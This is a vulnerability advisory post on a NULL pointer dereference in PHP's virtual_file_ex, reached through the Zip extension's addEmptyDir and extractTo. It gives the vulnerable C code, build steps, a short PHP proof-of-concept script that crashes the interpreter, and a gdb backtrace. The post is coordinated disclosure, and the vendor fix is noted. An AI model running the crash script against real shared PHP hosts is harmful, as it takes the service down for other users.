---
title: "PHP NULL pointer dereference in virtual_file_ex (v. master-Git-2016-02-09)"
date: 2016-02-09 00:00:00
preview: ""
---

* _Author_: Martino Sani
* _Software_: PHP
* _Version_: master-Git-2016-02-09
* _Release date_: 2016-02-09
* _CVE_: -
* _Reference_: https://bugs.php.net/bug.php?id=71561

A malicious user could create an evil php script in order to crash the PHP interpreter. The issue could compromise the availability of the PHP interpreter in the web hosting services, where the PHP interpreter could be shared among some users.

`virtual_file_ex` method in the `zend_virtual_cwd.c` file uses a `char *` argument that could be NULL. I identified this issue through `extractTo` method in the PHP Zip extension, opening a not existing ZIP archive.

`zend_virtual_cwd.c`:

```c
CWD_API int virtual_file_ex(cwd_state *state, const char *path, verify_path_func verify_path, int use_realpath)
{
    // path could be NULL
    int path_length = (int)strlen(path);
```

The issue is triggerable via `addEmptyDir` and `extractTo` Zip extension methods, if not existing zip archive will be opened.
Vulnerable code into extractTo method (`php_zip.c`) is shown below:

```c
/* Extract all files */
// zip_get_num_files returns 1 (intern->nentry is equal to 1) because, I think, addEmptyDir incremented it.
int filecount = zip_get_num_files(intern);

if (filecount == -1) {
    // ...
}

for (i = 0; i < filecount; i++) {

    // zip_get_name returns NULL
    char *file = (char*)zip_get_name(intern, i, ZIP_FL_UNCHANGED);

    // php_zip_extract_file uses virtual_file_ex
    if (!php_zip_extract_file(intern, pathto, file, strlen(file))) {
        RETURN_FALSE;
    }
}
```

# PHP build command

```
./buildconf --force
./configure --prefix=/opt/php --enable-debug --enable-zip
make && make install
```

# Test script

```
<?php

$zip = new ZipArchive();

// Open a not existing zip file
$zip->open("/dev/shm/notexisting.zip", ZIPARCHIVE::CREATE);

$zip->addEmptyDir("foo");

// Program terminated with signal SIGSEGV, Segmentation fault.
$zip->extractTo("/dev/shm/");

$zip->close();

?>
```

# Expected result

PHP interpreter should not crash.
No actions could be performed by `extractTo` method because the zip file does not physically exist, or the "in-memory" zip archive could be handled as a normal archive (if possible).

# Actual result

PHP interpreter crash with a SIGSEGV.

```
$ gdb) where
#0  strlen () at ../sysdeps/x86_64/strlen.S:106
#1  0x000000000079055a in c_ziparchive_extractTo (execute_data=0x7f3656a15120, return_value=0x7f3656a15100) at /php-src/master/src/ext/zip/php_zip.c:2671
#2  0x0000000000891c3a in ZEND_DO_FCALL_SPEC_RETVAL_UNUSED_HANDLER () at /php-src/master/src/Zend/zend_vm_execute.h:1024
#3  0x0000000000890610 in execute_ex (ex=0x7f3656a15030) at /php-src/master/src/Zend/zend_vm_execute.h:422
#4  0x0000000000890721 in zend_execute (op_array=0x7f3656a82000, return_value=0x0) at /php-src/master/src/Zend/zend_vm_execute.h:466
#5  0x00000000008362e8 in zend_execute_scripts (type=8, retval=0x0, file_count=3) at /php-src/master/src/Zend/zend.c:1427
#6  0x00000000007a76ae in php_execute_script (primary_file=0x7ffd6efe8db0) at /php-src/master/src/main/main.c:2484
#7  0x0000000000908079 in do_cli (argc=3, argv=0x18a1c40) at /php-src/master/src/sapi/cli/php_cli.c:974
#8  0x0000000000909043 in main (argc=3, argv=0x18a1c40) at /php-src/master/src/sapi/cli/php_cli.c:1345
```

# Notes

* 2016-02-09: Vendor notification.
* 2016-02-09: Vendor fixes the issue.

The author is not responsible for the misuse of the information provided in this advisory.